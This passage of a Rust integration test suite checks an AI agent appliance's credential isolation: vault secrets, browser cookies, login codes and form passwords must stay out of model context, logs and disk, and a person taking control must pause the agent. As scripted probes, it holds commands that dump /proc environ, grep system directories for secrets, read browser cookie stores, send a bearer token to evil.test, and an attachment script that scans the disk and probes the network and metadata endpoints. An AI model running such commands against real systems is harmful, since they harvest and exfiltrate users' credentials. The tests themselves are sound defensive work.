//! Invariant 2: credentials never appear in model context, the sandbox or the log.
//!
//! Prevents: credentials harvested through the agent (Nx s1ngularity, 2025).

// Test code: a failed unwrap is a failed test (AGENTS.md: none outside tests).
#![allow(clippy::unwrap_used, clippy::expect_used)]

use magnus_invariants::{mcp, scan, *};
use serde_json::json;

#[tokio::test(flavor = "multi_thread")]
async fn credentials_are_used_but_never_seen() {
    let mail = mcp::mail().start().await;
    let model = FakeModel::start(steps(vec![
        contract_unchecked("check the account and send a note", "note sent"),
        // A careless app echoes the Authorization header back in its result.
        tool("mail__whoami", json!({})),
        tool(
            "sandbox_exec",
            json!({ "command": "cat /proc/self/environ | tr '\\0' '\\n'; cat /proc/cmdline; \
                                grep -rIl CANARY- /etc /root /tmp /home /workspace /run 2>/dev/null; echo SCAN-DONE" }),
        ),
        tool("mail__send", json!({ "to": "bob@corp.example", "subject": "hi", "body": "hello" })),
        fail("done"),
    ]))
    .await;
    let app = Appliance::start(Spec::default().app("mail", &mail, "public", "private", &[("whoami", "read"), ("send", "irreversible")]), &model).await;
    let alice = app.api("alice");
    assert!(alice.put_policy("org", &org_policy(&permit_execute("mail__send"))).await.is_success());
    let id = alice.submit("Check which mail account you use, look around the sandbox, then email bob.").await;
    alice.wait_settled(&id).await;

    // The credentials were really used, at the boundary.
    let app_secret = app.app_secrets["mail"].clone();
    assert!(!mail.calls().is_empty(), "the app was never called");
    for c in mail.calls() {
        assert_eq!(c.bearer(), Some(app_secret.as_str()), "the app call lacked the vault credential");
    }
    assert_eq!(mail.effects("send"), 1);
    let reqs = model.requests();
    assert!(!reqs.is_empty());
    for r in &reqs {
        let key = r.headers.get("x-api-key").cloned().or_else(|| r.headers.get("authorization").and_then(|v| v.strip_prefix("Bearer ").map(String::from)));
        assert_eq!(key.as_deref(), Some(app.provider_key.as_str()), "the model call lacked the vault credential");
    }
    let sandbox_out = model.at_turn(3).expect("sandbox output reached the model").last_results()[0].text.clone();
    assert!(sandbox_out.contains("SCAN-DONE"), "the sandbox probe did not run: {sandbox_out}");

    let mut secrets: Vec<(String, String)> = vec![("app credential".into(), app_secret), ("provider key".into(), app.provider_key.clone())];
    for p in &app.spec.people {
        secrets.push((format!("{}'s API token", p.id), p.token.clone()));
    }
    let dump = app.db.dump().await;
    let logs = app.logs();
    for (what, s) in &secrets {
        for (i, r) in reqs.iter().enumerate() {
            assert!(!scan::contains(r.text().as_bytes(), s), "{what} reached the model in request {i}");
        }
        assert!(!scan::contains(dump.as_bytes(), s), "{what} is in the database");
        assert!(!scan::contains(logs.as_bytes(), s), "{what} is in the server's output");
        let files = scan::files_containing(&app.state_dir, s);
        assert!(files.is_empty(), "{what} is in plain text in the server's state (workspaces included): {files:?}");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn secrets_can_be_written_but_not_read_back() {
    let model = FakeModel::start(steps(vec![])).await;
    let app = Appliance::start(Spec::default(), &model).await;
    let alice = app.api("alice");
    let carol = app.api("carol");
    let value = canary("written");

    assert!(alice.put_secret("extra", &value).await.is_success());
    let st = carol.put_secret("extra", "overwritten").await;
    assert!(st == 401 || st == 403, "a person without the owner role wrote a secret: {st}");

    for path in ["/v1/secrets/extra", "/v1/secrets", "/v1/secrets/anthropic_api_key"] {
        for who in [&alice, &carol] {
            let (st, body) = who.get(path).await;
            let text = body.to_string();
            assert!(!scan::contains(text.as_bytes(), &value) && !scan::contains(text.as_bytes(), &app.provider_key), "GET {path} returned a secret value ({st})");
        }
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_snapshot_holds_no_vault_material_and_is_stored_encrypted() {
    let computerd = Computerd::start();
    let crm = mcp::crm().start().await;
    let model = FakeModel::start(steps(vec![contract_unchecked("read", "read"), tool("crm__get_record", json!({ "id": "42" })), complete("read")])).await;
    let spec = Spec::default().app("crm", &crm, "internal", "private", &[("get_record", "read")]).computer(&computerd.socket);
    let app = Appliance::start(spec, &model).await;
    let alice = app.api("alice");
    let credential = canary("vault");
    assert!(alice.put_secret("extra", &credential).await.is_success());
    // A run has really used a connector, so its credential was in play.
    let used = alice.submit("Read record 42.").await;
    alice.wait_settled(&used).await;
    let connector = crm.calls_to("get_record").first().and_then(|c| c.bearer().map(String::from)).expect("the run did not call the connector with its credential");
    let (_, made) = alice.post("/v1/computers", json!({})).await;
    let id = made["id"].as_str().unwrap().to_string();
    let at = |rest: &str| format!("/v1/computers/{id}{rest}");
    let (code, started) = alice.post(&at("/start"), json!({})).await;
    assert_eq!(code, 200, "{started}");

    // In a file and in memory, so a scan that reads nothing cannot pass.
    let second = canary("in-the-computer");
    computerd.exec(&id, &format!("echo {second} > /workspace/note; echo {second} > /tmp/in-memory; sync"));
    let (code, _) = alice.post(&at("/hibernate"), json!({})).await;
    assert_eq!(code, 200);

    let provider_key = app.provider_key.to_string();
    let found = computerd.snapshot_holds(&id, &[&second, &credential, &provider_key, &connector]);
    assert!(found[0].1, "the scan found nothing it should have");
    assert!(!found[0].0, "the snapshot is readable without its key");
    assert!(found[1..].iter().all(|(stored, plain)| !stored && !plain), "a credential is in the snapshot");
}

/// Test 18. While a person holds control the agent takes no step and captures
/// nothing. Handback gives it a fresh screenshot and a log entry.
#[tokio::test(flavor = "multi_thread")]
async fn capture_stops_and_the_agent_pauses_while_a_person_holds_control() {
    let computerd = Computerd::start();
    let released = std::sync::Arc::new(tokio::sync::Notify::new());
    let wait = released.clone();
    let model = FakeModel::start(script(move |c| {
        let wait = wait.clone();
        async move {
            match c.turn() {
                0 => contract_unchecked("look", "seen"),
                1 => tool("computer_screenshot", json!({})),
                2 => {
                    wait.notified().await;
                    tool("computer_screenshot", json!({}))
                }
                3 => complete("done"),
                _ => fail("script over"),
            }
        }
    }))
    .await;
    let app = Appliance::start(Spec::default().computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let (_, made) = alice.post("/v1/computers", json!({})).await;
    let id = made["id"].as_str().unwrap().to_string();
    let (code, started) = alice.post(&format!("/v1/computers/{id}/start"), json!({})).await;
    assert_eq!(code, 200, "{started}");
    let task = alice.submit("Take a look at your screen.").await;
    let frames = || async {
        let admin = app.db.admin().await;
        let n: i64 = admin.query_one("SELECT count(*) FROM public.events WHERE kind IN ('tool_result', 'handback')", &[]).await.unwrap().get(0);
        n
    };
    eventually("the agent's first screenshot came back", PATIENCE, || async { model.at_turn(2).map(|_| ()) }).await;
    let (code, body) = alice.post(&format!("/v1/computers/{id}/takeover"), json!({})).await;
    assert_eq!(code, 200, "{body}");
    released.notify_one();
    eventually("the run paused for the person", PATIENCE, || async { (alice.task(&task).await["status"] == "suspended").then_some(()) }).await;
    let (before_calls, before_frames) = (model.requests().len(), frames().await);
    tokio::time::sleep(std::time::Duration::from_secs(4)).await;
    assert_eq!(model.requests().len(), before_calls, "the agent took a step during a takeover");
    assert_eq!(frames().await, before_frames, "the agent captured the screen during a takeover");

    let (code, body) = alice.post(&format!("/v1/computers/{id}/handback"), json!({})).await;
    assert_eq!(code, 200, "{body}");
    eventually("the agent resumed", PATIENCE, || async { model.at_turn(3).map(|_| ()) }).await;
    let resumed = model.at_turn(3).unwrap();
    assert!(resumed.text().contains("handed it back"), "the agent was not told about the takeover");
    assert!(resumed.text().contains("\"type\":\"image\""), "the resumed request has no screenshot");
    assert!(frames().await > before_frames, "no fresh screenshot was recorded");
    let (_, activity) = alice.get(&format!("/v1/computers/{id}/activity")).await;
    assert!(activity.to_string().contains("took control") && activity.to_string().contains("handed back"), "the log does not show the takeover: {activity}");
}

// Step 7: browser VMs and credentials. Each needs real VMs.

const SITE_PROXY: &str = "http://10.200.0.1:3128";

fn bare(site: &FakeWeb) -> String {
    site.base.trim_start_matches("http://").to_string()
}

/// A model that opens a task, then runs `calls` in order, then finishes.
fn model_steps(identity: &str, calls: Vec<(&str, serde_json::Value)>) -> magnus_invariants::model::Script {
    let mut replies = vec![contract_unchecked("use the browser", "done")];
    for (name, mut input) in calls {
        if input.get("identity").is_some() {
            input["identity"] = json!(identity);
        }
        replies.push(tool(name, input));
    }
    replies.push(complete("done"));
    steps(replies)
}

async fn identity_of(app: &Appliance, site: &str) -> String {
    let (code, made) = app.api("alice").post("/v1/identities", json!({ "site": site })).await;
    assert!(code.is_success(), "{made}");
    made["id"].as_str().unwrap().to_string()
}

/// Signing in after reading a page is asked about, under the Rule of Two.
async fn approve_sign_in(alice: &Api, task: &str) {
    let asked = alice.wait_item(task, "approval").await;
    assert_eq!(asked["details"]["tool"], "browser_sign_in", "{asked}");
    assert!(alice.respond(asked["id"].as_str().unwrap(), json!({ "decision": "approve" })).await.is_success());
}

/// A run whose work is done completes: checking is internal, and no
/// criteria are put to the person (spec rev 140).
async fn finish(alice: &Api, task: &str) {
    alice.wait_status(task, &["completed"]).await;
}

fn permits(tools: &[&str]) -> String {
    org_policy(&tools.iter().map(|t| permit_execute(t)).collect::<Vec<_>>().join("\n"))
}

#[tokio::test(flavor = "multi_thread")]
async fn the_agent_cannot_reach_a_browser_vm_or_its_profile() {
    let computerd = Computerd::start();
    let session = canary("session-cookie");
    let site = FakeWeb::start(&[("/login", &*format!("cookie:session={session}; Path=/|<html><p>signed in</p></html>"))]).await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let identity = identity_of(&app, "acct.test").await;
    model.set_script(model_steps(&identity, vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" }))]));
    assert!(alice.put_policy("org", &permits(&["browser_as_navigate"])).await.is_success());
    let task = alice.submit("Open my account page.").await;
    alice.wait_settled(&task).await;
    assert!(
        site.seen().iter().any(|s| s.path == "/login"),
        "the page was never loaded: {:?} {:?}",
        site.hits(),
        model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text).collect::<Vec<_>>()
    );

    // The guest offers page commands and nothing else.
    for req in [
        json!({ "op": "exec", "command": "cat /workspace/profile/Default/Cookies", "timeout_s": 10 }),
        json!({ "op": "read", "path": "/workspace/profile/Default/Cookies" }),
        json!({ "op": "write", "path": "/tmp/x", "data_b64": "eA==" }),
        json!({ "op": "evaluate", "script": "document.cookie" }),
        json!({ "op": "cookies" }),
        json!({ "op": "storage_state" }),
        json!({ "op": "devtools" }),
    ] {
        let reply = computerd.guest(&identity, req.clone());
        assert!(reply["error"].is_string(), "the agent reached a profile through {req}: {reply}");
        assert!(!reply.to_string().contains(&session), "the agent reached a profile through {req}");
    }
    // The person's own computer: the same routes, and no road to the VM.
    for path in [format!("/v1/computers/{identity}"), format!("/v1/computers/{identity}/files?path=/workspace/profile/Default/Cookies")] {
        assert_eq!(alice.get(&path).await.0, 404, "the agent reached a profile through {path}");
    }
    let (_, made) = alice.post("/v1/computers", json!({})).await;
    let computer = made["id"].as_str().unwrap().to_string();
    assert_eq!(alice.post(&format!("/v1/computers/{computer}/start"), json!({})).await.0, 200);
    let tried = computerd.root_shell(&computer, &format!("curl -s -m 5 -o /dev/null -w '%{{http_code}}' -x {SITE_PROXY} http://10.200.0.2:52/; echo; curl -s -m 5 --noproxy '*' -o /dev/null -w '%{{http_code}}' http://10.200.0.2:52/; echo"));
    assert!(tried.lines().all(|code| code != "200"), "the agent reached a profile through the network: {tried}");

    let dump = app.db.dump().await;
    for (i, r) in model.requests().iter().enumerate() {
        assert!(!scan::contains(r.text().as_bytes(), &session), "the agent reached a profile through model request {i}");
    }
    assert!(!scan::contains(dump.as_bytes(), &session), "the session is in the database");
    assert!(!scan::contains(app.logs().as_bytes(), &session), "the session is in the server's output");
    assert!(!computerd.volume_holds(&computer, &session), "the agent reached a profile through its computer's disk");

    // Stopped behind Magnus's back, the profile is sealed by the idle loop,
    // unreadable at rest, and a stranger's key does not open it.
    use base64::Engine;
    computerd.guest(&identity, json!({ "op": "sync" }));
    computerd.ask(json!({ "op": "stop", "id": identity }));
    let sealed = std::time::Instant::now();
    while computerd.volume_exists(&identity) {
        assert!(sealed.elapsed() < std::time::Duration::from_secs(240), "the profile stayed in plain form");
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    }
    assert!(!computerd.sealed_holds(&identity, &session), "the session is readable in the sealed profile");
    let stranger = base64::engine::general_purpose::STANDARD.encode([8u8; 32]);
    assert_eq!(computerd.try_ask(json!({ "op": "unseal_volume", "id": identity, "key_b64": stranger }))["ok"], false, "a wrong key opened the profile");
}

/// A login is often a cookie with no expiry, which Chromium drops on exit by
/// default. The identity's stays signed in across a stop of its browser VM.
#[tokio::test(flavor = "multi_thread")]
async fn a_login_kept_in_a_cookie_with_no_expiry_survives_a_stop() {
    let computerd = Computerd::start();
    let session = canary("session");
    let site = FakeWeb::start(&[("/login", &*format!("cookie:session={session}; Path=/|<html><p>in</p></html>")), ("/signed", "<html><p>your account</p></html>")]).await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let identity = identity_of(&app, "acct.test").await;
    assert!(alice.put_policy("org", &permits(&["browser_as_navigate"])).await.is_success());
    model.set_script(model_steps(&identity, vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" }))]));
    let task = alice.submit("Open the site.").await;
    alice.wait_settled(&task).await;
    assert!(site.seen().iter().any(|s| s.path == "/login"), "it did not sign in");
    computerd.guest(&identity, json!({ "op": "sync" }));
    computerd.ask(json!({ "op": "stop", "id": identity }));
    model.set_script(model_steps(&identity, vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/signed" }))]));
    let task = alice.submit("Open the account page.").await;
    alice.wait_settled(&task).await;
    let seen = site.seen();
    let signed = seen.iter().find(|s| s.path == "/signed").expect("it did not open its page after the stop");
    assert!(signed.cookie.as_deref().unwrap_or_default().contains(&session), "the login did not survive the stop: {signed:?}");
}

#[tokio::test(flavor = "multi_thread")]
async fn untrusted_reading_uses_a_browser_with_no_profile() {
    let computerd = Computerd::start();
    let session = canary("session");
    let site = FakeWeb::start(&[
        ("/login", &*format!("cookie:session={session}; Path=/|<html><p>in</p></html>")),
        ("/signed", "<html><p>your account</p></html>"),
        ("/public", "<html><p>a public page</p></html>"),
    ])
    .await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let identity = identity_of(&app, "acct.test").await;
    model.set_script(model_steps(
        &identity,
        vec![
            ("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" })),
            ("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/signed" })),
        ],
    ));
    assert!(alice.put_policy("org", &permits(&["browser_as_navigate", "browser_navigate"])).await.is_success());
    let task = alice.submit("Read this site.").await;
    alice.wait_settled(&task).await;
    // A task of its own: a run holding signed-in pages rightly asks before it
    // goes to the open web.
    model.set_script(model_steps(&identity, vec![("browser_navigate", json!({ "url": "http://acct.test/public" }))]));
    let task = alice.submit("Read the public page.").await;
    alice.wait_settled(&task).await;
    let seen = site.seen();
    let signed = seen.iter().find(|s| s.path == "/signed").unwrap_or_else(|| {
        panic!(
            "the identity did not open its page: {:?}",
            model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text.chars().take(240).collect::<String>()).collect::<Vec<_>>()
        )
    });
    assert!(signed.cookie.as_deref().unwrap_or_default().contains(&session), "the identity's own browser lost its login: {signed:?}");
    let public = seen.iter().find(|s| s.path == "/public").expect("the throwaway browser did not open the page");
    assert_eq!(public.cookie, None, "untrusted reading carried a login: {public:?}");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_surrogate_becomes_the_real_credential_only_after_approval_and_only_at_its_destination() {
    let computerd = Computerd::start();
    let real = canary("real-token");
    let site = FakeWeb::start(&[("/allowed", "<html>ok</html>"), ("/denied", "<html>no</html>")]).await;
    let other = FakeWeb::start(&[("/stolen", "<html>got it</html>")]).await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "app.test": [bare(&site)], "evil.test": [bare(&other)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let (_, made) = alice.post("/v1/computers", json!({})).await;
    let id = made["id"].as_str().unwrap().to_string();
    assert_eq!(alice.post(&format!("/v1/computers/{id}/start"), json!({})).await.0, 200);
    let (code, issued) = alice.post(&format!("/v1/computers/{id}/surrogates"), json!({ "name": "app", "value": real, "host": "app.test" })).await;
    assert!(code.is_success(), "{issued}");
    let surrogate = issued["surrogate"].as_str().unwrap().to_string();
    for host in ["app.test", "evil.test"] {
        assert!(alice.post(&format!("/v1/computers/{id}/destinations"), json!({ "host": host })).await.0.is_success());
    }
    let call = |host: &str, path: &str| {
        computerd.root_shell(&id, &format!("curl -s -m 20 -o /dev/null -w '%{{http_code}}' -x {SITE_PROXY} -H 'Authorization: Bearer {surrogate}' http://{host}{path}"))
    };

    assert_eq!(call("app.test", "/allowed"), "200", "an allowed request failed");
    let got = site.seen();
    let allowed = got.iter().find(|s| s.path == "/allowed").expect("the app was not reached");
    assert_eq!(allowed.authorization.as_deref(), Some(format!("Bearer {real}").as_str()), "the app did not get the real credential");

    model.set_reviewer(script(|_| async { review("deny", "not this request") }));
    assert_ne!(call("app.test", "/denied"), "200", "a denied request went through");
    assert!(!site.hits().iter().any(|p| p == "/denied"), "the real credential left without approval");

    model.set_reviewer(script(|_| async { review("allow", "fine") }));
    assert_ne!(call("evil.test", "/stolen"), "200", "the surrogate worked at another host");
    assert!(other.seen().is_empty(), "the real credential left without approval: {:?}", other.seen());

    assert!(!computerd.volume_holds(&id, &real), "the real credential is on the computer");
    let found = computerd.root_shell(&id, &format!("grep -rl '{real}' /workspace /etc /root /tmp 2>/dev/null; echo done"));
    assert_eq!(found.trim(), "done", "the real credential is in the computer: {found}");
    let dump = app.db.dump().await;
    assert!(!scan::contains(dump.as_bytes(), &real), "the real credential is in the database");
    assert!(!scan::contains(app.logs().as_bytes(), &real), "the real credential is in the server's output");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_secure_form_value_reaches_neither_the_model_nor_the_log() {
    let computerd = Computerd::start();
    let secret = canary("secure-form");
    let site = FakeWeb::start(&[
        ("/login", r#"<html><form action="/in" method="get"><input name="pw" placeholder="Password"></form></html>"#),
        ("/in", "<html><p>welcome back</p></html>"),
    ])
    .await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let identity = identity_of(&app, "acct.test").await;
    model.set_script(model_steps(
        &identity,
        vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" })), ("browser_sign_in", json!({ "identity": "", "password_field": "e1" }))],
    ));
    assert!(alice.put_policy("org", &permits(&["browser_as_navigate", "browser_sign_in", "browser_as_snapshot"])).await.is_success());
    let task = alice.submit("Sign in to my account.").await;
    approve_sign_in(&alice, &task).await;
    alice.wait_item(&task, "secure_form").await;
    let (code, filled) = alice.post(&format!("/v1/identities/{identity}/secure-form"), json!({ "target": "e1", "value": secret, "submit": true })).await;
    assert!(code.is_success(), "the secure form was refused: {filled}");
    assert!(site.hits().iter().any(|p| p.starts_with("/in?") && p.contains(&secret)), "the value never reached the page: {:?}", site.hits());
    finish(&alice, &task).await;

    model.set_script(model_steps(&identity, vec![("browser_as_snapshot", json!({ "identity": "" }))]));
    let task = alice.submit("Look at the page now.").await;
    alice.wait_settled(&task).await;
    let results: Vec<String> = model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text).collect();
    assert!(results.iter().any(|t| t.contains("welcome back")), "the page after the form was not read: {results:?}");

    for (i, r) in model.requests().iter().enumerate() {
        assert!(!scan::contains(r.text().as_bytes(), &secret), "a secure form value reached model request {i}");
    }
    assert!(!scan::contains(app.db.dump().await.as_bytes(), &secret), "a secure form value reached the log");
    assert!(!scan::contains(app.logs().as_bytes(), &secret), "a secure form value reached the server's output");
    let files = scan::files_containing(&app.state_dir, &secret);
    assert!(files.is_empty(), "a secure form value reached a file: {files:?}");
}

/// Every file and directory name under `root`.
fn walkdir_names(root: &std::path::Path) -> Vec<String> {
    let mut names = vec![];
    let mut dirs = vec![root.to_path_buf()];
    while let Some(d) = dirs.pop() {
        for e in std::fs::read_dir(&d).into_iter().flatten().flatten() {
            names.push(e.file_name().to_string_lossy().into_owned());
            if e.file_type().is_ok_and(|t| t.is_dir()) {
                dirs.push(e.path());
            }
        }
    }
    names
}

#[tokio::test(flavor = "multi_thread")]
async fn an_attachment_opens_only_in_a_per_run_sandbox() {
    use base64::Engine;
    let computerd = Computerd::start();
    let on_volume = canary("user-volume");
    let extracted = canary("extracted");
    let public = FakeWeb::start(&[("/", "<html>reached</html>")]).await;
    let host_ip = String::from_utf8(std::process::Command::new("hostname").arg("-I").output().unwrap().stdout).unwrap().split_whitespace().next().unwrap().to_string();
    let port = public.base.rsplit(':').next().unwrap().to_string();
    // Split, so the script does not contain what it looks for.
    let (head, tail) = on_volume.split_at(on_volume.len() / 2);
    let attack = format!(
        r#"#!/bin/sh
echo {extracted}
ls -la /workspace /workspace/* 2>&1
A={head}; B={tail}; grep -rl "$A$B" / 2>/dev/null --exclude-dir=proc --exclude-dir=sys && echo FOUND-CANARY
ls /workspace/profile 2>/dev/null && echo FOUND-PROFILE
for target in {host_ip}:{port} 127.0.0.1:{port} 169.254.169.254:80 10.200.0.1:3128 1.1.1.1:80; do
  curl -s -m 3 -o /dev/null http://$target/ && echo REACHED-$target
done
getent hosts example.com && echo RESOLVED-NAME
ip -o link | grep -v ' lo:' | head -3
"#
    );
    let model = FakeModel::start(steps(vec![])).await;
    let app = Appliance::start(Spec::default().computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let (_, made) = alice.post("/v1/computers", json!({})).await;
    let computer = made["id"].as_str().unwrap().to_string();
    assert_eq!(alice.post(&format!("/v1/computers/{computer}/start"), json!({})).await.0, 200);
    let data = base64::engine::general_purpose::STANDARD.encode(on_volume.as_bytes());
    assert!(alice.put(&format!("/v1/computers/{computer}/files"), json!({ "path": "/workspace/secret.txt", "data_b64": data })).await.0.is_success());
    model.set_script(steps(vec![
        contract_unchecked("read the attachment", "read"),
        tool("sandbox_exec", json!({ "command": "ls -la /workspace /workspace/inputs 2>&1; echo LISTED-WORK" })),
        tool("open_attachment", json!({ "name": "evil.sh", "command": "sh /workspace/inputs/attachment" })),
        complete("done"),
    ]));
    let file = base64::engine::general_purpose::STANDARD.encode(attack.as_bytes());
    let (code, made) = alice
        .post("/v1/tasks", json!({ "text": "Read the attachment from this email.", "from_outside": [{ "name": "evil.sh", "media_type": "text/x-shellscript", "data_b64": file }] }))
        .await;
    assert!(code.is_success(), "{made}");
    let task = made["task_id"].as_str().unwrap().to_string();
    alice.wait_settled(&task).await;
    assert_eq!(public.hits().len(), 0, "the attachment reached the public site");
    let reqs = model.requests();
    let result = reqs.iter().rev().flat_map(|r| r.last_results()).map(|r| r.text).find(|t| t.contains(&extracted)).unwrap_or_else(|| {
        panic!("the attachment did not run: {:?}", model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text.chars().take(240).collect::<String>()).collect::<Vec<_>>())
    });
    for bad in ["FOUND-CANARY", "FOUND-PROFILE", "REACHED-", "RESOLVED-NAME", "eth0"] {
        assert!(!result.contains(bad), "the attachment reached the user volume or a profile, or the network ({bad}): {result}");
    }
    let listing = reqs.iter().flat_map(|r| r.last_results()).map(|r| r.text).find(|t| t.contains("LISTED-WORK")).expect("the run's workspace was not listed");
    assert!(!listing.contains("evil.sh"), "the attachment entered the run's own workspace: {listing}");
    let left: Vec<_> = walkdir_names(&app.state_dir).into_iter().filter(|n| n.starts_with("attachment-")).collect();
    assert!(left.is_empty(), "the attachment's sandbox was left behind: {left:?}");
    let first = reqs.first().unwrap();
    assert!(!first.text().contains(&extracted), "the file's content was given to the model without opening it");
    for r in &reqs {
        for m in r.messages() {
            let text = m.to_string();
            if text.contains(&extracted) {
                assert!(text.contains("tool_result"), "the extracted text was not quoted data: {text}");
            }
        }
    }
    assert_eq!(alice.task(&task).await["taint"]["untrusted"], json!(true), "the extracted text was not quoted data: the run is not tainted");
    let (_, listing) = alice.get(&format!("/v1/computers/{computer}/files?path=/workspace/attachments/evil.sh")).await;
    assert!(!listing.to_string().contains("data_b64"), "the file was saved without the user: {listing}");
    let (code, saved) = alice.post(&format!("/v1/tasks/{task}/attachments/evil.sh/save"), json!({})).await;
    assert!(code.is_success(), "the user could not save the file: {saved}");
    let (code, listing) = alice.get(&format!("/v1/computers/{computer}/files?path=/workspace/attachments/evil.sh")).await;
    assert_eq!(code, 200, "the saved file is not on the volume: {listing}");
}

// Step 8: what must never reach the agent through mail.

#[tokio::test(flavor = "multi_thread")]
async fn a_login_code_never_reaches_the_agent() {
    let code = "482913".to_string();
    let reset = canary("reset");
    let signin = canary("signin");
    let body = format!(
        "Your verification code is {code}.\nReset your password at https://acct.example/reset?token={reset}\nOr use https://acct.example/magic-login/{signin}\nLunch on Friday works for me."
    );
    let mail = mcp::mail().tool("read", "read a message", json!({ "type": "object", "properties": {} }), {
        let body = body.clone();
        move |_, _, _| mcp::ok(json!({ "text": body }))
    });
    let mail = mail.start().await;
    let model = FakeModel::start(steps(vec![contract_unchecked("read mail", "read"), tool("mail__read", json!({})), complete("done")])).await;
    let spec = Spec::default().app("mail", &mail, "public", "private", &[("read", "read")]).filter_login_codes("mail");
    let app = Appliance::start(spec, &model).await;
    let alice = app.api("alice");
    let task = alice.submit("Read my new mail.").await;
    alice.wait_settled(&task).await;
    let reqs = model.requests();
    let result = reqs
        .iter()
        .flat_map(|r| r.last_results())
        .map(|r| r.text)
        .find(|t| t.contains("Lunch on Friday"))
        .unwrap_or_else(|| panic!("the rest of the message did not arrive: {:?}", reqs.iter().flat_map(|r| r.last_results()).map(|r| r.text).collect::<Vec<_>>()));
    assert!(result.contains("removed"), "nothing was filtered: {result}");
    let dump = app.db.dump().await;
    let logs = app.logs();
    for (what, secret) in [("the code", &code), ("the reset link", &reset), ("the sign-in link", &signin)] {
        for (i, r) in reqs.iter().enumerate() {
            assert!(!r.text().contains(secret.as_str()), "a login code reached the agent through model request {i}: {what}");
        }
        assert!(!dump.contains(secret.as_str()), "a login code reached the agent through the log: {what}");
        assert!(!logs.contains(secret.as_str()), "a login code reached the agent through the server's output: {what}");
        let files = scan::files_containing(&app.state_dir, secret);
        assert!(files.is_empty(), "a login code reached the agent through a file: {what}: {files:?}");
    }
}

const LOGIN_PAGE: &str = r#"<html><form action="/in" method="get"><input name="pw" placeholder="Password"></form></html>"#;

#[tokio::test(flavor = "multi_thread")]
async fn a_sign_in_with_no_saved_login_waits_for_the_person() {
    let computerd = Computerd::start();
    let secret = canary("waited-for");
    let site = FakeWeb::start(&[("/login", LOGIN_PAGE), ("/in", "<html><p>welcome back</p></html>")]).await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let identity = identity_of(&app, "acct.test").await;
    assert!(alice.put_policy("org", &permits(&["browser_as_navigate", "browser_sign_in"])).await.is_success());
    let sign_in = || {
        model_steps(
            &identity,
            vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" })), ("browser_sign_in", json!({ "identity": "", "password_field": "e1" }))],
        )
    };

    model.set_script(sign_in());
    let task = alice.submit("Sign in to my account.").await;
    approve_sign_in(&alice, &task).await;
    alice.wait_item(&task, "secure_form").await;
    let waiting = alice.wait_settled(&task).await;
    assert_ne!(waiting["status"], "completed", "the run went on without the sign-in");
    let asked = model.requests().len();
    let (code, filled) = alice.post(&format!("/v1/identities/{identity}/secure-form"), json!({ "target": "e1", "value": secret, "submit": true })).await;
    assert!(code.is_success(), "{filled}");
    finish(&alice, &task).await;
    assert!(model.requests().len() > asked, "the run did not carry on after the form");
    assert!(alice.open_items(&task, "secure_form").await.is_empty(), "the form is still open");

    model.set_script(sign_in());
    let task = alice.submit("Sign in again.").await;
    approve_sign_in(&alice, &task).await;
    let item = alice.wait_item(&task, "secure_form").await;
    alice.wait_settled(&task).await;
    let hits = site.hits().len();
    assert!(alice.respond(item["id"].as_str().unwrap(), json!({ "decision": "decline" })).await.is_success());
    finish(&alice, &task).await;
    assert!(alice.open_items(&task, "secure_form").await.is_empty(), "a declined form is still open");
    assert!(site.hits()[hits..].iter().all(|p| !p.starts_with("/in")), "a declined sign-in signed in");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_password_manager_fills_the_page_and_the_agent_never_has_it() {
    let computerd = Computerd::start();
    let (password, username) = (canary("manager-password"), canary("manager-user"));
    let (p, u) = (password.clone(), username.clone());
    let manager = FakeMcp::builder()
        .tool("get_login", "Get the login for a site.", json!({ "type": "object", "properties": { "site": { "type": "string" } } }), move |_, _, _| {
            mcp::ok(json!({ "username": u, "password": p }))
        })
        .start()
        .await;
    let site = FakeWeb::start(&[
        (
            "/login",
            r#"<html><form action="/in" method="get"><input name="u" placeholder="User"><input name="pw" type="password" placeholder="Password"><button>Go</button></form></html>"#,
        ),
        ("/in", "<html><p>welcome back</p></html>"),
    ])
    .await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] }, "password_manager": "pm" })).app(
        "pm",
        &manager,
        "public",
        "private",
        &[("get_login", "read")],
    );
